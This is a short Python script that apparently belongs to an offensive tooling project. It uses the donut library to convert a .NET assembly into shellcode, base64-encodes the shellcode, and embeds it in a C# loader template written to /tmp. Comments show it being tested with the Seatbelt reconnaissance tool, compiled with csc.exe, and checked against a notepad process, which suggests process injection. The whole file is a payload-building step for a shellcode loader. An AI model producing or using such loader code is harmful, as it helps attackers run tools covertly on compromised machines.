#!/usr/bin/env python3
# donut shellcode test --
# https://pypi.org/project/donut-shellcode/

import sys
import donut
import base64

# constants --
from .constant import PROGRAM_CS

def create(self, infile, arch, format, exit, nsclass, method, output):
    """ create donut shellcode -- """
    """ our test string -- """
    """ donut -o donut_v0.9.3_Seatbelt.bin -x 2 -c Seatbelt.Program -m Main -p "ARPTable" Seatbelt.exe """
    """ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:Desktop\donutTest.exe Z:\newfile.cs """
    """ tasklist | findstr noepad """
    """  """

    # parse args --
    shellcode = donut.create(
            file='{}'.format(infile),
            arch=arch,
            format=format,
            exit_opt=exit,
            cls='{}'.format(nsclass),
            method='{}'.format(method),
            output='{}'.format(output)
        )

    # open orig template --
    print('[i] writing template')
    with open ('{}'.format(PROGRAM_CS), 'r') as templ:
        source_templ = templ.read()

    # read bin shellcode / b64 it --
    with open (output, 'rb') as sc_outfile:
        sc_b64 = sc_outfile.read()
        sc_base64 = base64.b64encode(sc_b64)

    # replace and write new --
    # will update to use random name /tmp/*.cs --
    updated_templ = source_templ.replace('#replace#', str(sc_base64.decode()))
    with open ('/tmp/newfile.cs', 'w') as newfile:
        newfile.write(updated_templ)

